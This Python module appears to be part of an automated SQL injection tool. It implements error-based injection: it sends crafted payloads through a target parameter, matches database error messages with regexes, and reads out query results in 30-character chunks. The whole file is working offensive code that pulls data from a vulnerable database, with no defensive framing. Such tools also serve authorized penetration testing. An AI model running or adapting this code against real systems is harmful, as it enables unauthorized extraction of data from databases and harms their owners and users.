# -*- coding: utf-8 -*-
"""Error-based injection (v1.1: iterate all error-function spellings, compatible with extractvalue/updatexml being banned)

Convention: templates returned by dialect.error_payloads(marker) use {0} for "the expression to reflect",
      filled in uniformly by this module via .format(expr).
"""
import re
from techniques.base import BaseTechnique


class ErrorTechnique(BaseTechnique):
    name = "Error Based"

    PATTERNS = [
        r"XPATH syntax error: '([^']+)'",
        r"Duplicate entry '([^']+)'",
        r"~([0-9a-zA-Z_\-{}.@!]+)~",
        r"extractvalue\([^)]+\): (.*?)(?:\n|<)",
        r"SQL syntax.*?near '([^']+)'",
        # v1.1 additions: geometry functions / exp overflow / JSON / type conversion
        r"GEOMETRY field[^']*'([^']+)'",
        r"Cannot get geometry object[^']*'([^']+)'",
        r"DOUBLE value is out of range in '([^']+)'",
        r"'([^']*)'\s*is not a valid",
        r"Unknown column '([^']+)'",
        r"Conversion failed when converting the \w+ value '([^']+)'",
        r"Unclosed quotation mark after the character string '([^']+)'",
    ]

    CONNECTORS = ["1 AND ({p})", "1 AND {p}", "({p})"]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.payload_template = None
        self.connector = None
        self.concat_tpl = self.dialect.concat_templates()[0]

    # ---------------- Probe ----------------
    def probe(self):
        # With the {0} placeholder convention, verify with a known expression such as VERSION()/1 first
        marker = self.concat_tpl.format(a="0x7e", b="({0})", c="0x7e")
        for tpl in self.dialect.error_payloads(marker):
            try:
                cond = tpl.format(self.dialect.known_expr())
            except Exception:
                cond = tpl
            for conn in self.CONNECTORS:
                payload = conn.replace("{p}", cond)
                final = self.det.prefix + self._t(payload) + self.det.suffix
                r = self.req.send(final)
                if r["status"] == -1:
                    continue
                m = self._grep(r["text"])
                if m and m.strip():
                    self.payload_template = tpl
                    self.connector = conn
                    label = tpl[:52] + ("..." if len(tpl) > 52 else "")
                    print(f"    [+] Error spelling: {label}")
                    return True
        return False

    def _grep(self, text):
        for p in self.PATTERNS:
            m = re.search(p, text, re.IGNORECASE)
            if m:
                return m.group(1)
        return None

    def _render(self, inner_expr):
        try:
            cond = self.payload_template.format(inner_expr)
        except Exception:
            cond = self.payload_template
        return self.connector.replace("{p}", cond)

    def _cond_true(self, condition):
        return True

    # ---------------- Extraction ----------------
    def extract(self, sql_expr):
        result = ""
        seg_len = 30
        for start in range(1, 500, seg_len):
            chunk = self._extract_segment(sql_expr, start, seg_len)
            if not chunk:
                break
            result += chunk
            if len(chunk) < seg_len:
                break
        return result

    def _extract_segment(self, sql_expr, start, length):
        inner = self.concat_tpl.format(
            a="0x7e", b=f"SUBSTR(({sql_expr}),{start},{length})", c="0x7e"
        )
        payload = self._render(inner)
        final = self.det.prefix + self._t(payload) + self.det.suffix
        r = self.req.send(final)
        if r["status"] == -1:
            return ""
        m = self._grep(r["text"])
        if not m:
            return ""
        return m.strip("~")

    def extract_length(self, sql_expr):
        return len(self.extract(sql_expr))
